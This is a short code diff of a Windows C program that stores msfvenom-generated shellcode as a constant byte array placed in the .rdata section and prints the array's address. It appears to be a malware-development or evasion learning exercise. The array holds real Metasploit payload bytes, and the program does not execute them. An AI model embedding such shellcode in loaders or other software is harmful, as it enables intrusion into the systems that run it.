@@ -1,8 +1,8 @@
 #include <Windows.h>
 #include <stdio.h>
 
-//loading into .rdata section
-const unsigned char Data_RawData[] = {
+//msfvenom shellcode
+const unsigned char Rdata_RawData[] = {
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
 "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
@@ -27,7 +27,8 @@ const unsigned char Data_RawData[] = {
 
 int main() {
 
-	printf("[i] Data_RawData var: 0x%p \n", Data_RawData);
+	printf("[i] Rdata_RawData var: 0x%p \n", Rdata_RawData);
 	printf("[#] Press <Enter> To Quit...\n");
 	getchar();
+	return 0;
 }
